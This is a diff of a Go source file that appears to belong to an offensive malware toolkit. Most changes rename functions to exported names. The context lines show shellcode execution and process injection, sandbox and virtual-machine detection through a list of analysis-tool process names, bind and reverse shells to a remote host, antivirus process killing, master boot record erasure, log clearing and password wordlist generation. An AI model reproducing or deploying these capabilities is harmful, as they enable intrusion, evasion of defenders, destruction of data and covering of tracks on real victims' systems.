@@ -100,11 +100,7 @@ var cyan = color.New(color.FgBlue).SprintFunc()
 var bold = color.New(color.Bold).SprintFunc()
 var yellow = color.New(color.FgYellow).SprintFunc()
 
-func _start_http_server() {
-
-}
-
-func _revert(s string) string {
+func Revert(s string) string {
 	r := []rune(s)
 	for i, j := 0, len(r)-1; i < len(r)/2; i, j = i+1, j-1 {
 		r[i], r[j] = r[j], r[i]
@@ -112,7 +108,7 @@ func _revert(s string) string {
 	return string(r)
 }
 
-func _ip_increment(ip net.IP) {
+func IpIncrement(ip net.IP) {
 	for j := len(ip) - 1; j >= 0; j-- {
 		ip[j]++
 		if ip[j] > 0 {
@@ -311,17 +307,17 @@ func gen_cpu_load(cores int, interval string, percentage int) {
 	time.Sleep(t * time.Second)
 }
 
-func random_int(min int, max int) int {
+func RandomInt(min int, max int) int {
 	rand.Seed(time.Now().UnixNano())
 	return rand.Intn(max-min) + min
 }
 
-func random_select_str(list []string) string {
+func RandomSelectStr(list []string) string {
 	rand.Seed(time.Now().UnixNano())
 	return list[rand.Intn(len(list))]
 }
 
-func random_select_str_nested(list [][]string) []string {
+func RandomSelectStrNested(list [][]string) []string {
 	rand.Seed(time.Now().UnixNano())
 	return list[rand.Intn(len(list))]
 }
@@ -385,11 +381,21 @@ func random_string(n int) string {
 	return string(b)
 }
 
-func exit_on_error(e error) {
+func ExitOnError(e error) {
 	if e != nil {
 		print_error(e.Error())
 		os.Exit(0)
 	}
+}
+
+func RemoveFromSlice(slice []string, element string) []string {
+	res := []string{}
+	for _, e := range slice {
+		if e != element {
+			res = append(res, e)
+		}
+	}
+	return res
 }
 
 func shellcode_run(shellcode []byte) error {
@@ -444,20 +450,20 @@ func shellcode_inject(shellcode []byte, pid int) error {
 	return nil
 }
 
-func ip_local() string {
+func GetLocalIp() string {
 	conn, _ := net.Dial("udp", "8.8.8.8:80")
 	defer conn.Close()
 	ip := conn.LocalAddr().(*net.UDPAddr).IP
 	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
 }
 
-func ip_global() string {
+func GetGlobalIp() string {
 	ip := ""
 	resolvers := []string{"https://api.ipify.org?format=text",
 		"http://myexternalip.com/raw",
 		"http://ident.me"}
 	for {
-		url := random_select_str(resolvers)
+		url := RandomSelectStr(resolvers)
 		resp, _ := http.Get(url)
 		/*if err != nil{
 		    print_warning(err.Error())
@@ -475,25 +481,25 @@ func ip_global() string {
 func iface() (string, string) {
 	addrs, err := net.InterfaceAddrs()
 	_ = addrs
-	exit_on_error(err)
+	ExitOnError(err)
 	current_iface := ""
 	interfaces, _ := net.Interfaces()
 	for _, interf := range interfaces {
 		if addrs, err := interf.Addrs(); err == nil {
 			for _, addr := range addrs {
-				if strings.Contains(addr.String(), ip_local()) {
+				if strings.Contains(addr.String(), GetLocalIp()) {
 					current_iface = interf.Name
 				}
 			}
 		}
 	}
 	netInterface, err := net.InterfaceByName(current_iface)
-	exit_on_error(err)
+	ExitOnError(err)
 
 	name := netInterface.Name
 	macAddress := netInterface.HardwareAddr
 	hwAddr, err := net.ParseMAC(macAddress.String())
-	exit_on_error(err)
+	ExitOnError(err)
 	return name, hwAddr.String()
 }
 
@@ -558,8 +564,8 @@ func info() map[string]string {
 		"cpu_num":   fmt.Sprintf("%v", i.CPUs),
 		"kernel":    fmt.Sprintf("%v", i.Kernel),
 		"core":      fmt.Sprintf("%v", i.Core),
-		"local_ip":  ip_local(),
-		"global_ip": ip_global(),
+		"local_ip":  GetLocalIp(),
+		"global_ip": GetGlobalIp(),
 		"ap_ip":     ap_ip,
 		"mac":       mac,
 	}
@@ -578,7 +584,7 @@ func create_wordlist(words []string) []string {
 		word := words[w]
 		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
 		wordlist = append(wordlist, strings.ToUpper(word))
-		wordlist = append(wordlist, _revert(word))
+		wordlist = append(wordlist, Revert(word))
 		wordlist = append(wordlist, first_to_upper)
 		wordlist = append(wordlist, first_to_upper+"1")
 		wordlist = append(wordlist, first_to_upper+"12")
@@ -634,12 +640,12 @@ func files_pattern(directory, pattern string) (map[string]string, error) {
 	return out_map, nil
 }
 
-func b64d(str string) string {
+func B64D(str string) string {
 	raw, _ := base64.StdEncoding.DecodeString(str)
 	return fmt.Sprintf("%s", raw)
 }
 
-func b64e(str string) string {
+func B64E(str string) string {
 	return base64.StdEncoding.EncodeToString([]byte(str))
 }
 
@@ -769,7 +775,7 @@ func cmd_run(command string) {
 	} else {
 		fmt.Println(string(output))
 	}
-	//exit_on_error("[COMMAND EXEC ERROR]", err)
+	//ExitOnError("[COMMAND EXEC ERROR]", err)
 }
 
 func cmd_blind(command string) {
@@ -778,7 +784,7 @@ func cmd_blind(command string) {
 	parts = parts[1:len(parts)]
 	cmd := exec.Command(head, parts...)
 	_, _ = cmd.CombinedOutput()
-	//exit_on_error("[COMMAND EXEC ERROR]", err)
+	//ExitOnError("[COMMAND EXEC ERROR]", err)
 }
 
 func cmd_dir(dirs_cmd map[string]string) ([]string, error) {
@@ -913,12 +919,12 @@ func sandbox_filepath() bool {
 	}
 }
 
-func sandbox_proc() bool {
+func SandboxProc() bool {
 	sandbox_processes := []string{`vmsrvc`, `tcpview`, `wireshark`, `visual basic`, `fiddler`,
 		`vmware`, `vbox`, `process explorer`, `autoit`, `vboxtray`, `vmtools`,
 		`vmrawdsk`, `vmusbmouse`, `vmvss`, `vmscsi`, `vmxnet`, `vmx_svga`,
 		`vmmemctl`, `df5serv`, `vboxservice`, `vmhgfs`}
-	p, _ := processes()
+	p, _ := Processes()
 	for _, name := range p {
 		if contains_any(name, sandbox_processes) {
 			return true
@@ -1035,7 +1041,7 @@ func sandbox_mac() bool {
 
 func sandbox_all() bool {
 	values := []bool{
-		sandbox_proc(),
+		SandboxProc(),
 		sandbox_filepath(),
 		sandbox_cpu(2),
 		sandbox_disk(50),
@@ -1058,7 +1064,7 @@ func sandbox_all() bool {
 func sandbox_all_n(num int) bool {
 	num_detected := 0
 	values := []bool{
-		sandbox_proc(),
+		SandboxProc(),
 		sandbox_filepath(),
 		sandbox_cpu(2),
 		sandbox_disk(50),
@@ -1108,9 +1114,9 @@ func set_ttl(duration string) {
 	c.Start()
 }
 
-func bind(port int) {
+func Bind(port int) {
 	listen, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
-	exit_on_error(err)
+	ExitOnError(err)
 	defer listen.Close()
 	for {
 		conn, err := listen.Accept()
@@ -1121,9 +1127,9 @@ func bind(port int) {
 	}
 }
 
-func reverse(host string, port int) {
+func Reverse(host string, port int) {
 	conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
-	exit_on_error(err)
+	ExitOnError(err)
 	for {
 		_handle_reverse(conn)
 	}
@@ -1191,7 +1197,7 @@ func pkill_av() error {
 	return nil
 }
 
-func processes() (map[int]string, error) {
+func Processes() (map[int]string, error) {
 	prs := make(map[int]string)
 	processList, err := ps.Processes()
 	if err != nil {
@@ -1205,7 +1211,7 @@ func processes() (map[int]string, error) {
 	return prs, nil
 }
 
-func portscan(target string, timeout, threads int) []int {
+func Portscan(target string, timeout, threads int) []int {
 	pr := []int{}
 	ps := portscanner.NewPortScanner(target, time.Duration(timeout)*time.Second, threads)
 	opened_ports := ps.GetOpenedPort(0, 65535)
@@ -1216,7 +1222,7 @@ func portscan(target string, timeout, threads int) []int {
 	return pr
 }
 
-func portscan_single(target string, port int) bool {
+func PortscanSingle(target string, port int) bool {
 	ps := portscanner.NewPortScanner(target, time.Duration(10)*time.Second, 3)
 	opened_ports := ps.GetOpenedPort(port-1, port+1)
 	if len(opened_ports) != 0 {
@@ -1351,7 +1357,7 @@ func erase_mbr(device string, partition_table bool) error {
 	return nil
 }
 
-func networks() ([]string, error) {
+func Networks() ([]string, error) {
 	wifi_names := []string{}
 	switch runtime.GOOS {
 	case "windows":
@@ -1382,14 +1388,14 @@ func networks() ([]string, error) {
 	return wifi_names, nil
 }
 
-func parse_cidr(cidr string) ([]string, error) {
+func ExpandCidr(cidr string) ([]string, error) {
 	ip, ipnet, err := net.ParseCIDR(cidr)
 	if err != nil {
 		return nil, err
 	}
 
 	var ips []string
-	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); _ip_increment(ip) {
+	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); IpIncrement(ip) {
 		ips = append(ips, ip.String())
 	}
 
@@ -1402,7 +1408,7 @@ func parse_cidr(cidr string) ([]string, error) {
 	}
 }
 
-func clear_logs() error {
+func ClearLogs() error {
 	switch runtime.GOOS {
 	case "windows":
 		os.Chdir("%windir%\\system32\\config")
